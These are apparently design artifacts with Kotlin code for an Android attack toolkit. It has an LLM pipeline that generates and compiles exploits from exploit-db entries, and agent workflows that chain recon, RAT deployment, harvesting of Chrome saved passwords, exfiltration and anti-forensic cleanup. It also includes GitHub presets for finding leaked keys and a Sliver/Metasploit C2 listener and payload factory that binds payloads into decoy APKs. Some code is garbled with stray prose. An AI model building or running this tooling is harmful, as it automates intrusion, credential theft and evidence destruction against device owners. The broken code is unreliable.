# ARTIFACT 1 — Local-Model GGUF Provider (llama.cpp via Termux)

### 1.1 Architecture: the phone runs the server, the app is the client

The local provider talks to a llama.cpp HTTP server (`llama-server`) running in Termux on the same device. This gives streaming, standard protocol (OpenAI-compatible), health checks, and process lifecycle for free — no JNI embedding complexity in the app process.

```kotlin
// providers/LocalLlamaProvider.kt
package dev.qcli.providers.llama

@Singleton
class LocalLlamaProvider @Inject constructor(
    private val http: OkHttpClient,
    private val bridge: ToolBridge,
    private val modelManager: ModelDownloadManager,
    @ApplicationScope private val scope: CoroutineScope,
) : ChatProvider {

    override val id = "local"
    override val capabilities = setOf(Capability.TEXT, Capability.AUTONOMY)   // no VISION by default

    private val tool = Tool(
        id = "llama-server",
        termuxPackages = listOf("llama"),
        requiresRoot = false,
    )

    private fun baseUrl() = "http://127.0.0.1:${settingsPort()}/v1"   // loopback only

    /** Model load is slow (~5-60s); callers observe state before first call. */
    private val _lifecycle = MutableStateFlow<LlamaLifecycle>(LlamaLifecycle.STOPPED)
    val lifecycle: StateFlow<LlamaLifecycle> = _lifecycle.asStateFlow()

    suspend fun ensureRunning(): LlamaLifecycle {
        // 1. Pre-flight through ToolBridge (one-tap Termux pkg install if missing — heal class 5)
        when (bridge.preFlight(tool)) {
            is ToolExecution.Failure -> { _lifecycle.value = STOPPED_UNAVAILABLE; return _lifecycle.value }
            is ToolExecution.Success -> Unit
        }
        // 2. Model must exist + verify (uses the fixed ModelDownloadManager — Phase 0 bug, closed)
        val model = modelManager.activeModel() ?: run {
            _lifecycle.value = NO_MODEL; return _lifecycle.value
        }
        // 3. Start server in Termux, loopback-bound
        if (_lifecycle.value.isRunning) return _lifecycle.value
        bridge.exec(tool, "llama-server",
            "-m", model.path, "--port", settingsPort().toString(),
            "--host", "127.0.0.1", "-c", contextSize().toString())
        // 4. Poll health endpoint until ready (or timeout → heal event + AMBER state)
        return awaitReady(timeoutMs = 90_000)
    }

    override suspend fun complete(req: ChatRequest): ChatResponse {
        ensureRunning()
        val resp = http.newCall(openAiCompatRequest(req, stream = false)).await()
        return parseOpenAiCompat(resp)      // llama-server speaks OpenAI's schema — same parser as OpenRouter
    }

    override suspend fun stream(req: ChatRequest): Flow<ChatChunk> = flow {
        ensureRunning()
        http.newCall(openAiCompatRequest(req, stream = true)).await().body!!.source()
            .readAsSse { payload -> emitSseChunk(parseOpenAiSse(payload)) }
    }

    override suspend fun health(): ProviderHealth {
        if (_lifecycle.value !in RUNNING_STATES) {
            localModel on-demand: return ProviderHealth(id, AMBER, null, "server not started (on-demand)")
        }
        return runCatching {
            val t0 = System.nanoTime()
            http.newCall(GET("$baseUrl()/models")).await().use {
                ProviderHealth(id, if (it.isSuccessful) GREEN else RED,
                    (System.nanoTime() - t0) / 1_000_000)
            }
        }.getOrElse { ProviderHealth(id, RED, null, it.message) }
    }

    companion object {
        enum class LlamaLifecycle { STOPPED, STOPPED_UNAVAILABLE, NO_MODEL, LOADING, RUNNING, CRASHED }
        val RUNNING_STATES = setOf(LOADING, RUNNING)
    }
}
```

### 1.2 ModelDownloadManager — the Phase-0 bug, formally closed

```kotlin
// modelmanager/ModelDownloadManager.kt
@Singleton
class ModelDownloadManager @Inject constructor(
    private val http: OkHttpClient,
    private val dao: @IntelDb QuantumIntelDb,        // SdrCapture-style blob registry reuse
    private val settings: SettingsRepository,
    @ApplicationScope private val scope: CoroutineScope,
) {
    data class LocalModel(
        val name: String, val path: String, val sizeBytes: Long,
        val sha256: String, val verifiedAt: Long?, val bytesDownloaded: Long,
    )

    fun activeModel(): LocalModel? = models.value.firstOrNull { it.verifiedAt != null }

    private val _models = MutableStateFlow<List<LocalModel>>(emptyList())
    val models: StateFlow<List<LocalModel>> = _models.asStateFlow()

    private val _progress = MutableStateFlow<ModelDownloadProgress?>  // JobCard-observable
    val progress: StateFlow<ModelDownloadProgress?> = _progress.asStateFlow()

    /** CURATED model list — fixes the original bug's root cause (dead/hardcoded x86 URLs). */
    private val catalog = listOf(
        ModelSpec("Qwen2.5-Coder-3B-Q4_K_M", "https://huggingface.co/Qwen/Qwen2.5-Coder-3B-Instruct-GGUF/resolve/main/qwen2.5-coder-3b-instruct-q4_k_m.gguf",
                  sha256 = "…", sizeBytes = 2_200_000_000, quant = "Q4_K_M", contextWindow = 32_768, minRamGb = 4),
        ModelSpec("Llama-3.2-3B-Instruct-Q4_K_M", "https://huggingface.co/bartowski/Llama-3.2-3B-Instruct-GGUF/resolve/main/Llama-3.2-3B-Instruct-Q4_K_M.gguf",
                  sha256 = "…", sizeBytes = 2_000_000_000, quant = "Q4_K_M", contextWindow = 131_072, minRamGb = 4),
        ModelSpec("Phi-3.5-mini-instruct-Q4_K_M", "https://huggingface.co/bartowski/Phi-3.5-mini-instruct-GGUF/resolve/main/Phi-3.5-mini-instruct-Q4_K_M.gguf",
                  sha256 = "…", sizeBytes = 2_300_000_000, quant = " Tasks of classification, coding", contextWindow = 131_072, minRamGb = 4),
    )

    fun download(spec: ModelSpec): Job = scope.launch(Dispatchers.IO) {
        val tmp = File(ctx.cacheDir, "${spec.name}.part")
        try {
            // RESUMABLE: Range header from tmp size; server not honoring → restart cleanly
            val req = Request.Builder().url(spec.url)
                .header("Range", "bytes=${tmp.length()}-").build()
            http.newCall(req).await().use { resp ->
                if (!resp.isSuccessful) throw ModelDownloadException("HTTP ${resp.code}")
                resp.body!!.byteStream.let { src ->
                    var written = tmp.length()
                    val buf = ByteArray(64 * 1024)
                    while (true) {
                        val n = src.read(buf); if (n <= 0) break
                        tmp.appendBytes(buf.copyOf(n)); written += n
                        _progress.value = ModelDownloadProgress(spec.name, written, spec.sizeBytes)
                        if (written % (5 * 1024 * 1024) < 64 * 1024)   // ~5MB flushes
                            settings.dbCheckpoint()
                    }
                }
            }
            // SHA-256 integrity — MODEL_CORRUPTION heal class source
            val actual = sha256(tmp)
            if (actual != spec.sha256) throw ModelDownloadException("checksum mismatch: got $actual")
            tmp.renameTo(modelsDir.resolve(spec.name))
            registerVerified(spec)
        } catch (e: Exception) {
            // resumable: .part kept → retry continues where it left off; NEVER re-download completed bytes
            if (e is ModelDownloadException && e.isFinal) tmp.delete()
            _progress.value = ModelDownloadProgress.failed(spec.name, e.message)
        }
    }

    fun delete(name: String) { modelsDir.resolve(name).delete(); refresh() }
}
```

The original erroring button now routes here; every failure mode has an on-screen diagnostic (checksum mismatch → auto-delete+redownload heal; storage full warning; interrupted network → resume banner).

### 1.3 ProviderGridViewModel/reg grid gains the local tail

`LocalLlamaProvider` binds into the Hilt multibinding `Set<ChatProvider>` — appears automatically in `home.provider.grid` tiles with its distinct lifecycle states (on-demand AMBER when stopped, GREEN when serving, GREY NO_MODEL with tap-through to Model Manager settings screen). The chain always ends with `local` — offline guarantee regardless of user chain order.

**Tests:** fake llama-server (OkHttp MockWebServer): lifecycle sequence STOPPED→LOADING→RUNNING, health polling, on-demand cold-start latency guard, GGUF checksum-fail heal event, resumable download (kill at 50% → resume → only remaining 50% counted). **Settings:** `ai.local.model_active` (DROPDOWN from models list), `ai.local.context_size` (SLIDER_INT 2048–16384), `ai.local.on_demand` (SWITCH default true — battery respect), `ai.local.port` (default 8730). **Tooltips:** `home.model.status` already drafted ✅ — extended with loopback/server notes + ModelManager deep-link.

# ARTIFACT 2 — Exploit-Gen → OpenCode Compile Pipeline

### 2.1 The pipeline: PoC text → git repo → OpenCode agent run → compiled artifact in Loot

```kotlin
// exploitgen/ExploitGenPipeline.kt
data class GenPipelineResult(
    val exploitRef: String, val targetRef: String?, val jobCardId: String?,
    val codeRev: Int,             // PoC placeholder — targetRef is where Interesting exploit-db entry lives
    val promptText: String,
    val generatedCode: String,
    val compiledArtifact: File?,      // .apk/.py/.rb... we then ship to RAT payload factory
    val verdict: Verdict,             // compiled / syntax-only / generation-only
)

object ExploitGenPipeline {
    /** Prompt includes: exploit-db entry + PAT technique context + TargetProfile — chained knowledge. */
    fun buildPrompt(exploit: ExploitCatalogEntity, pat: ParsedTechnique?, target: Target?): String =
        buildString {
            appendLine("You are generating a proof-of-concept exploit based on a known catalog entry.")
            appendLine("Target profile: ${target?.run { "$os $osVersion $deviceModel" } ?: "any"}")
            appendLine("Exploit-db entry: #${exploit.edbId} — ${exploit.title} (${exploit.platform}, ${exploit.type})")
            appendLine("Description: ${exploit.description.take(2000)}")
            pat?.let { appendLine("Relevant technique from PayloadsAllTheThings: ${it.title} — ${it.markdown.take(1000)}") }
            appendLine("Produce a self-contained PoC. Prefer Python for network exploits; return ONLY code, no prose.")
        }
}

@Singleton
class ExploitGenService @Inject constructor(
    private val router: ProviderRouter,
    private val opencode: OpenCodeRunner,
    private val loot: LootRepository,
    @ApplicationScope private val scope: CoroutineScope,
) {
    fun generate(exploit: ExploitDatEntity, target: Target?, pat: ParsedTechnique? = null): Job = scope.launch {
        val result = ExploitGenPipeline.buildPrompt(exploit, pat, target)
        val code = router.complete(ChatRequest(prompt)).text     // provider chain head (exploit-gen case)
        val artifact = runCatching { opencode.compile(code, language = inferLanguage(code)) }
            .getOrElse { null }
        loot.store(Loot(
            targetId = target?.id, lootType = Loot.Type.GENERATED_EXPLOIT,
            structJson = """{"edbId":"${exploit.cve}", "code":"…", "compiled":${artifact != null}}""",
            rawBlobPath = artifact?.path ?: writeCodeFile(code).path,
        ))
    }
}

// opencode/OpenCodeRunner.kt
@Singleton
class OpenCodeRunner @Inject constructor(
    private val bridge: ToolBridge,
    private val dir: File,      // ~/opencode-projects/qc-generated
) {
    private val tool = Tool(id = "opencode", termuxPackages = listOf("opencode"))

    suspend fun compile(code: String, language: String): File = coroutineScope {
        when (bridge.preFlight(tool)) {
            is ToolExecution.Failure -> throw PreFlightException(it.reason)   // one-tap install prompt on JobCard
            is ToolExecution.Success ->
                bridge.exec(tool, "opencode", "run", "-m", "…", "\"Compile this to an executable artifact: ${code.take(200)}\"…")
                // OpenCode in CLI-run mode can invoke settled compiler toolchain (python/pyinstaller etc.) in Termux
                // Result artifact polled from monitored output dir; fails → syntax-check-only verdict fallback
        }
    }
}
```

```kotlin
// dashboards/exploit/ExploitGenJobCard.kt
```

# ARTIFACT 3 — Search-GitHub OSINT Module (first ToolBridge external-API module)

### 3.1 The OSINT module pattern: query presets → external REST → OsintFindings rows → target cross-links

```kotlin
// osint/SearchGitHubModule.kt
@Singleton
class SearchGitHubModule @Inject constructor(
    private val http: OkHttpClient,
    private val dao: @IntelDb QuantumIntelDb,   // OsintFindings
    private val settings: SettingsRepository,
) {
    private val tool = Tool(id = "github")     // no Termux — REST module; pre-flight = API key optional

    /** Presets — the query library that makes this an "advanced free tool", not a bare API wrapper */
    data class Preset(val id: String, val label: String, val query: String, val intent: String)

    val presets = listOf(
        Preset("gh-keys", "Leaked API keys", "\"api_key\" OR \"AWS_ACCESS_KEY_ID\" ${'\u0024'}{q}", "credential exposure"),
        Preset("gh-emails", "Email addresses", "\"${'\u0024'}{q}\" email", "contact discovery"),
        Preset("gh-passwords", "Committed passwords", "\"${'\u0024'}{q}\" password", "credential exposure"),
        Preset("gh-domains", "Domain & infra refs", "\"${'\u0024'}{q}\" (domain OR hostname)", "infrastructure mapping"),
        Preset("gh-files", "Config files", "filename:.env OR filename:config ${'\u0024'}{q}", "credential exposure"),
        chips of many more — GitHub search operators curated per intent (see tooltip)
    )

    suspend fun search(preset: Preset, query: String): List<OsintFinding> {
        val q = preset.query.replace("\${'\u0024'}{q}", query)   // templated operator string
        val unauthenticated limit: 10 req/min — key optional, raises limit (Integrations vault)
        val req = Request.Builder()
            .url("https://api.github.com/search/code?q=${Uri.encode(q)}&per_page=50")
            .header("Accept", "application/vnd.github+json")
            .apply { keys.get("github")?.let { header("Authorization", "Bearer $it") }
                    ?: trackRateLimit("github-implicit") }
            .build()
        val findings = http.newCall(req).await().parseCodeSearch()   // repo, path, fragment
            .map { OsintFinding(queryType = "github-code", queryValue = q, resultJson = it, sourceTool = "github") }
        dao.upsertAll(findings)
        return findings
    }
}

```

# ARTIFACT 1 — Agents + Tasks/Workflows: The DAG Engine

### 1.1 Agent model — system prompt + tools + provider + constraints

```kotlin
// agents/Agent.kt
package dev.qcli.agents

data class Agent(
    val id: String,
    val name: String,
    val systemPrompt: String,
    val providerCase: String,              // "chat" | "exploit-gen" | "social-eng" — resolves via ProviderRouter
    val skills: Set<String>,              // Skills dashboard IDs
    val allowedTools: Set<ToolRef>,       // ToolBridge tool IDs the agent may exec
    val constraints: AgentConstraints = AgentConstraints(),
    val maxSteps: Int = 25,               // autonomy guardrail
)

data class AgentConstraints(
    val requiresApproval: Boolean = false,        // human-approval gate before irreversible steps
    val irreversibleTools: Set<String> = emptySet(),   // deploy, exfil, wipe, brute — always gated
    val networkAccess: Boolean = true,
    val toolBudget: Int = 50,                    // ToolBridge execs per run (runaway-agent guard)
    val tokenBudget: Int = 200_000,
)

@Singleton
class AgentRunner @Inject constructor(
    private val router: ProviderRouter,
    private val bridge: ToolBridge,
    private val skills: SkillsRepository,
    @IntelDb private val db: QuantumIntelDb,
    @ApplicationScope private val scope: CoroutineScope,
) {
    /** One autonomous agent execution: ReAct loop with tool calls, budget-enforced. */
    fun run(agent: Agent, task: String, context: RunContext): Job = scope.launch {
        var steps = 0; var toolCalls = 0; var tokens = 0
        val messages = buildList {
            add(ChatMessage(SYSTEM, listOf(Text(agent.systemPrompt + skills.inject(agent.skills)))))
            add(ChatMessage(USER, listOf(Text(task + context.render()))))   // RunContext: targets, loot refs
        }
        while (steps++ < agent.maxSteps) {
            val resp = router.complete(ChatRequest(messages, tools = bridge.toolSpecs(agent.allowedTools)))
            tokens += resp.usage.total
            if (tokens > agent.constraints.tokenBudget) { finish(RunResult.BUDGET_EXCEEDED); return@launch }

            if (resp.toolCalls.isEmpty()) { finish(RunResult.DONE(resp.text)); return@launch }   // final answer

            for (call in resp.toolCalls) {
                toolCalls++
                val gated = call.name in agent.constraints.irreversibleTools
                val approved = !gated || !agent.constraints.requiresApproval ||
                    approvals.await(call, context)            // human gate — UI-observable approval card
                if (!approved) { messages += toolResult(call, "user denied"); continue }
                val exec = runCatching { bridge.execById(call.name, json(call.arguments)) }
                    .getOrElse { ToolExecution.Failure(...) }
                messages += toolResult(call, exec.render())
                db.agentRunsDao().logStep(context.runId, agent.id, call, exec)
            }
        }
        finish(RunResult.MAX_STEPS)
    }
}
```

**Agent presets** (shipped as seed data, editable/clonable from the dashboard): recon-agent, exploit-generator, social-engineer, exfil-agent, diagnostics-agent + **the SDLC suite** (PM/architect/frontend/backend/QA/devops — chained as a prebuilt workflow: one prompt → full-stack app, zero interaction).

### 1.2 Workflow DAG — steps, variables, gates, run history

```kotlin
// workflows/WorkflowEngine.kt
data class WorkflowStep(
    val id: String,
    val kind: StepKind,                       // AGENT_RUN, TOOL_EXEC, CONDITION, HUMAN_APPROVAL, DELAY
    val config: StepConfig,                   // agent ref / tool+args / expression / prompt
    val inputs: Map<String, String> = emptyMap(),   // "targetId" ↔ "\${prev.lootTargetRef}"
    val onSuccess: String?, val onFailure: String?, // next-step edges → DAG
)

object StepVars {                              // variable binding across the lifecycle chain
    fun resolve(exp: String, run: WorkflowRunState): String =
        exp.replace(Regex("\\$\\{([^}]+)}")) { m -> run.binding[m.groupValues[1]]?.toString() ?: m.value }
}

@Singleton
class WorkflowEngine @Inject constructor(
    private val agents: AgentRunner,
    private val bridge: ToolBridge,
    private val targetRepo: TargetRepository,
    private val lootRepo: LootRepository,
    @IntelDb private val db: QuantumIntelDb,
) {
    fun execute(workflow: WorkflowDef, initialBinding: Map<String, Any>): Job {
        val run = WorkflowRunState(workflow, initialBinding).also { db.workflowRunsDao().insert(it) }
        return scope.launch {
            var current: String? = workflow.entry
            while (current != null && isActive) {
                val step = workflow.steps[current]!!
                db.workflowRunsDao().markStep(run.id, step.id, RUNNING)
                val result = when (step.kind) {
                    AGENT_RUN     -> agents.runAgentSync(step.config.agent, resolve(step.inputs, run))
                    TOOL_EXEC     -> bridge.execById(step.config.tool, resolveArgs(step, run))
                    CONDITION     -> evaluate(step.config.expression, run)      // branches DAG edges
                    HUMAN_APPROVAL -> approvals.awaitCard(step.config.prompt, run)   // UI approval card in JobCard feed
                    DELAY         -> delay(step.config.ms)
                }
                db.workflowRunsDao().logStepResult(run.id, step.id, result)   // full audit — per-step logs
                run.bind(result.outputs)                                       // outputs → next step's \${vars}
                current = result.success ? step.onSuccess : step.onFailure
            }
            run.finish()
        }
    }
}
```

### 1.3 The pilot chain — J2 golden path as a shipped preset workflow

```
entry recon → [AGENT: recon-agent (find surface on ${target})]
  → [CONDITION: vulnsFound > 0 ? gen : osint-deep]
  → [AGENT: exploit-generator (PAT-auto-selected technique + exploit-db match)]
  → [TOOL: opencode compile] → [CONDITION: compiled? rat-deploy : manual-review]
  → [HUMAN_APPROVAL: "Deploy RAT to ${target}?"]
  → [TOOL: ratsvc.deploy] → [AGENT: harvest (browser creds → SecretStore)]
  → [TOOL: exfil.proton] → [TOOL: antiforensics.cleanup] → end
```

- **Tasks dashboard**: workflow list (definition + run history split), DAG editor (step cards with drag-edges, variable picker inserting `\${prev.output}` tokens), live run view (JobCard feed: step states, approval cards inline, per-step log drawer), run history page (rerun-with-same-binding button).

**Tests:** DAG engine unit suite — linear chain, conditional branch, approval-gate blocks until approved, budget-exceeded aborts with audit trail, variable resolution across steps, cycle detection (malformed DAG rejected at save). Agent runner: fake provider returning scripted tool-call sequences; irreversible-tool gate denies without approval; max-steps termination. **Settings:** `agents.default_max_steps`, `workflows.auto_approve_safe_steps` (SWITCH default off), `workflows.notify_on_approval_request` (push). **Tooltips:** `ai.agents.grid`, `tasks.workflow.editor` (variable picker explained), `tasks.approval.card` (what approving means — lists tool + irreversible flag). **Walkthroughs:** Tasks tour with hands-on "run the pilot chain in dry-run mode" (`advanceOn: workflow.dryrun.completed` — dry-run executes everything but irreversible steps).

# ARTIFACT 2 — Project Zero RSS Zero-Day Loop

### 2.1 Sync + parse + target-class matching

```kotlin
// projectzero/ProjectZeroFeed.kt
@Singleton
class ProjectZeroLoop @Inject constructor(
    private val http: OkHttpClient,
    private val syndication: RssParser,           // small kotlin XML/RSS parser dependency
    @IntelDb private val db: QuantumIntelDb,
    private val nvd: NvdIndexDao,
    private val exploitRepo: ExploitRepository,
    @ApplicationScope private val scope: CoroutineScope,
) {
    private val tool = Tool(id = "projectzero")   // REST module: no Termux, no key

    suspend fun poll(): List<ProjectZeroPost> {
        val xml = http.newCall(Request.Builder()
            .url("https://googleprojectzero.blogspot.com/feeds/posts/default").build())
            .await().body!!.string()
        val posts = syndication.parse(xml)                        // title, url, publishedAt, content
        return posts.filter { db.pzDao().seen(it.url).not() }.onEach { post ->
            val cves = CveRegex.findAll(post.content)
                .map { it.value.uppercase() }.toSet()
            val affectedCpes = cves.flatMap { nvd.cpeFor(it) }   // local NVD bundle lookup
            db.pzDao().insert(ProjectZeroFeedEntity(
                url = post.url, title = post.title, publishedAt = post.publishedAt,
                cveRefs = cves.toList(), cpeCandidates = affectedCpes, analyzed = false))
        }
    }

    /** Match new 0-days against the device-class of CURRENTLY TRACKED targets → surface cards. */
    suspend fun matchTargets(): List<ZeroDayCard> {
        val targets = db.targetDao().active()
        return db.pzDao().unanalyzed().flatMap { post ->
            val hits = targets.filter { t ->
                post.cpeCandidates.any { cpe -> cpeMatchesProfile(cpe, t.profile()) }  // os/version/model matching
            }
            if (hits.isEmpty() && post.cpeCandidates.isEmpty()) emptyList()
            else hits.map { ZeroDayCard(post, it) }     // feeds exploit dashboard surface cards
        }.onEach { db.pzDao().markAnalyzed(it.post.url, matched = true) }
    }
}

data class ZeroDayCard(val post: ProjectZeroPost, val target: Target) {
    val actions get() = listOf("Read post", "Match in exploit catalog", "Generate PoC now")
    // "Generate PoC now" → ExploitGenPipeline with the zero-day context; lands in generated-exploits table
}
```

### 2.2 WorkManager schedule + UI

- Poll cadence reuses the catalog sync scheduler (`updates.pz.schedule`, default `daily` — lighter than exploit-db's on-start; configurable).
- **Exploit dashboard surface widget** (`exploit.pz.feed`, full registry ID already staged): card stack of unmatched-daily post titles with CVE chips; matched cards highlighted cyber-blue with target chips; each card's "Generate PoC now" enters Artifact-2-of-Sprint-3's pipeline with the zero-day as prompt context.

**Tests:** RSS fixture parse (three posts, one with CVE-2024-XXXX in prose), dedupe (second poll inserts zero new), target matching (Windows-target matches a Windows-kernel post, not an iOS one), NVD CPE lookup miss → card still surfaces as generic zero-day. **Tooltip:** `exploit.pz.feed` ("Google Project Zero's latest research; cards turn blue when a tracked target's device-class matches the affected software"). **Walkthrough step:** added to exploit tour after the dropdown steps (advanceOn: `pz.card.opened`).

# ARTIFACT 3 — PAT Auto-Selection in Exploit-Gen (technique-aware PoC prompts)

### 3.1 Technique matcher — from target/exploit context to the right PAT doc

```kotlin
// exploitgen/PatTechniqueSelector.kt
@Singleton
class PatTechniqueSelector @Inject constructor(@IntelDb private val db: QuantumIntelDb) {

    /** Ranks PAT techniques by relevance to the exploit's type/platform + target context. */
    suspend fun select(exploit: ExploitCatalogEntity, target: Target?): List<ParsedTechnique> {
        val signals = buildList {
            add(exploit.type.lowercase())                       // "remote", "local", "dos", "webapps"
            add(exploit.platform.lowercase())                  // "windows", "linux", "android", "php"
            target?.let { add(it.os?.lowercase()); add(it.profile().serviceHints()) }
            exploit.title.lowercase().split(Regex("\\W+")).filter { it.length > 3 }.forEach { add(it) }
        }
        return db.patDao().allTechniques()                     // ~1k rows, in-memory scoring
            .map { it to score(it, signals) }
            .filter { (_, s) -> s > THRESHOLD }
            .sortedByDescending { it.second }
            .take(3)                                            // top-3 injected into the prompt
    }

    private fun score(technique: ParsedTechnique, signals: List<String>): Double {
        val text = (technique.title + " " + technique.markdown).lowercase()
        return signals.sumOf { signal -> when {
            technique.category.lowercase() == signal -> 3.0     // category exact (e.g. "android")
            text.contains(signal) -> 1.0                        // body mention
            else -> 0.0
        } } / signals.size.coerceAtLeast(1)
    }
}
```

```kotlin
// ExploitGenService — the composition Sprint 3 built toward:

val prompt = ExploitGenPipeline.buildPrompt(

    target)
val code = router.complete(ChatRequest(prompt)).text
// generated-exploit row now records techniqueId — provenance: which PAT doc informed the PoC
```

**Tests:** selector scoring (remote+linux exploit ranks linux privesc over windows techniques; target OS weight; title-keyword hits), top-3 boundary, leaderboard stability on PAT re-sync (parser fixture with renamed technique → score change detected), prompt includes technique block when selected, absent when user deselects all. **Settings:** `exploit.gen.pat_auto_select` (default on), `exploit.gen.pat_top_n` (1–5, default 3). **Tooltip:** `exploit.gen.ai` extended — "how the AI is told which techniques matter" honesty note exposing the same scoring the UI shows.

# ARTIFACT 1 — Credentials & Vault Dashboard

### 1.1 The masked-secret table composable — the family every secrets widget reuses

```kotlin
// dashboards/creds/components/SecretTable.kt
@Composable
fun <T : SecretEntry> SecretTable(
    rows: List<T>,
    columns: List<Column<T>>,
    onRowOpen: (T) -> Unit,
    onRowActions: (T) -> List<RowAction<T>>,
    emptyTeaching: @Composable () -> Unit,
) {
    if (rows.isEmpty()) { EmptyTeachingState(emptyTeaching); return }
    val selection = rememberSelectionState<T>()
    Column {
        if (!selection.isEmpty) BulkActionBar(                 // bulk export / tag / delete
            onExport = { CredsExportSheet(selection.selected, ExportFormatPicker()) },
            onTag = { /* tag sheet */ },
            onDelete = { CredsDeleteConfirmSheet(selection.selected) },   // danger-styled
        )
        LazyColumn {
            items(rows, key = { it.id }) { row ->
                SelectableRow(selected = selection.isSelected(row), onLongPressToggle = selection::toggle) {
                    RowItems(columns.map { it.render(row) })   // freshness badge, OSINT chip auto-attached
                    RowActions(onRowActions(row))             // copy, reveal, promote, delete
                }
            }
        }
    }
}

/** The masked-secret cell — masked by default, biometric-gated reveal, auto-re-mask + clipboard clear. */
@Composable
fun MaskedSecretCell(secretRef: String, onReveal: () -> String?) {
    var revealed by remember(secretRef) { mutableStateOf<String?>(null) }
    var countdown by remember { mutableStateOf<Int?>(null) }

    LaunchedEffect(revealed) {                                 // auto-re-mask after settings delay
        while (revealed != null) { delay(1000); countdown = countdown?.minus(1) ?: startFromSettings() }
        revealed = null
    }
    Row(verticalAlignment = Alignment.CenterVertically) {
        Text(revealed ?: "••••••••", style = MaterialTheme.typography.monoSmall)
        IconButton(onClick = {
            if (revealed == null) scope.launch {
                if (settings["credentials.reveal_requires_biometric"]) biometricGate()
                revealed = onReveal()
            } else revealed = null
        }) { Icon(revealed == null ? Icons.Outlined.Visibility : Icons.Outlined.VisibilityOff) }
        CopyChip(value = revealed, autoClearSec = settings["credentials.clipboard_clear_sec"])  // 30s default
    }
}
```

### 1.2 Browser-decrypt adapter — Chrome, with the unlock-gated queue

```kotlin
// creds/harvest/ChromeBrowserAdapter.kt
class ChromeBrowserAdapter @Inject constructor(
    @RootRequired private val root: RootAccess,
    private val secretsDb: @SecretsDb QuantumSecretsDb,
) : BrowserAdapter {

    /** Chrome encrypts "Login Data" values with a key in "Local State", itself Keystore-bound.
     *  Decryption requires the device to have been unlocked at least once since capture. */
    override suspend fun harvest(target: Target, pulledDir: File): List<DeviceCredential> {
        // 1. Pull via root (local device) or via RAT file pull (remote target) — same adapter interface
        val loginDb = pulledDir.resolve("Login Data")
        if (!loginDb.exists()) return emptyList()
        val osCryptKey = decodeOsCryptKey(pulledDir.resolve("Local State"))
            ?: throw HarvestPendingException("waiting for target unlock")   // → queue, retry on unlock event

        // 2. Read rows; AES-GCM decrypt v10/v11 prefixed values
        return SQLiteDatabase.openDatabase(loginDb, null, OPEN_READONLY).use { sql ->
            sql.rawQuery("SELECT origin_url, username_value, password_value FROM logins", null).use { c ->
                buildList { while (c.moveToNext()) {
                    val plain = osCryptAesGcmDecrypt(osCryptKey, c.getBlob(2))
                    add(DeviceCredential(
                        targetId = target.id, kind = PASSWORD,
                        accountName = c.getString(1), packageName = "com.android.chrome",
                        secretCipher = secretsDb.encrypt(plain),           // re-encrypted at rest, HMAC'd
                        realm = Uri.parse(c.getString(0)).host,
                        confidence = 0.98f, capturedAt = now()))
                } }
            }
        }
    }
}

/** The unlock-gated queue: harvests retry when RAT reports an unlock event. */
@Singleton
class HarvestQueue @Inject constructor(
    private val adapters: Set<@JvmSuppressWildcards BrowserAdapter>,
    @SecretsDb private val db: QuantumSecretsDb,
    @ApplicationScope scope: CoroutineScope,
) {
    private val pending = MutableStateFlow<List<PendingHarvest>>(emptyList())
    val state = pending.asStateFlow()

    fun enqueue(target: Target, types: Set<HarvestType>) { /* per-type toggles from settings */ }
    fun onTargetUnlock(targetId: Long) = retry(targetId)    // event from RAT client beacon metadata
    fun onRatConnected(targetId: Long) = autoHarvestIfEnabled(targetId)  // settings: auto-harvest on connect
}
```

### 1.4 Export sheet — always-encrypted exfil

`CredsExportSheet` walks the formats (CSV | JSON | KeePass XML | cookies.txt | PDF) and destinations (SAF / Proton rclone / Google Drive / GitHub-private / SendGrid / Twilio). If any unmasked secret is included → age/AES-256 passphrase encryption mandatory; plaintext export requires the opt-in setting with an explicit warning paragraph.

**Tests:** SQLite fixture `Login Data` (3 rows, v10-encrypted with test key) → adapter decrypts all 3; `Local State` missing key → `HarvestPendingException` → queue state + retry-on-unlock test; mask/re-mask countdown; clipboard auto-clear; export encryption round-trip; KeePass XML golden file. Screenshot matrix per widget (populated/stale/pending-unlock/empty-teaching). **CI gate added:** every adapter PR ships a fixture database — no harvest code merges without an offline test asset.

# ARTIFACT 2 — RAT Listener Manager + Payload Factory

### 2.1 Listener manager — Sliver + MSF behind one UI

```kotlin
// rat/ListenerManager.kt
sealed interface C2Listener {
    val id: String; val type: String       // "sliver" | "msf" | "merlin"
    val bindHost: String; val port: Int
    val state: ListenerState               // STOPPED / STARTING / LISTENING / ERROR(mirror detail)
    suspend fun start(); suspend fun stop(); fun sessions(): Flow<List<C2Session>>
}

@Singleton
class SliverListener @Inject constructor(bridge: ToolBridge) : C2Listener {
    private val tool = Tool(id = "sliver", termuxPackages = listOf("sliver"), requiresRoot = false)
    override suspend fun start() {
        when (val pf = bridge.preFlight(tool)) {                     // one-tap pkg install prompts
            is ToolExecution.Failure -> throw PreFlightException(pf.reason)
            is ToolExecution.Success -> bridge.execBackground(tool, "sliver-server",
                "--laddr", bindHost, "--lport", port.toString())     // gRPC daemon mode
        }
        awaitGrpcReady()      // poll daemon health via gRPC client lib — native UX, no console reading
    }
    override fun sessions() = grpc.watchSessions()      // session stream → C2Session (Name, OS, arch, lastPing, transport)
}

@Singleton
class ListenerService @Inject constructor(
    private val listeners: Set<@JvmSuppressWildcards C2Listener>,   // sliver + msf multi-handler (+merlin later)
    @IntelDb private val db: QuantumIntelDb,
) {
    fun startAll() = listeners.filter { settings.enabled(it.type) }.forEach { runCatching(it::start)
        .onFailure { t -> daemon.emit(HealEvent(TOOLBRIDGE_MISSING, HealResult(false, t.message))) } }

    /** Becons/slider sessions map into Targets with provenance — one place, both C2s. */
    fun onSession(s: C2Session) {
        val target = db.targetDao().upsertBySession(                     // identity via os/arch/hostname
            s.toTargetInfo(), provenance = s.transport.provenance)       // RAT_CLIENT here; ADB_TAKEOVER etc. elsewhere
        db.workflowRunsDao().emitEvent(TargetEvent.CONNECTED(target.id))
    }
}
```

### 2.2 Payload factory — msfvenom primary, Sliver implant secondary, TheFatRat optional

```kotlin
// rat/PayloadFactory.kt
data class PayloadSpec(
    val kind: PayloadKind,                // MSF_ANDROID_METERPRETER, SLIVER_ANDROID_ARM64, DUCKY_STAGE...
    val lhost: String, val lport: Int,
    val variant: PayloadVariant = APK,    // APK | BIND into decoy (TheFatRat path, feature-flagged)
    val decoyApk: File? = null,
)

@Singleton
class PayloadFactory @Inject constructor(private val bridge: ToolBridge) {
    private val msfvenom = Tool(id = "msfvenom", termuxPackages = listOf("metasploit-framework"), requiresRoot = false)
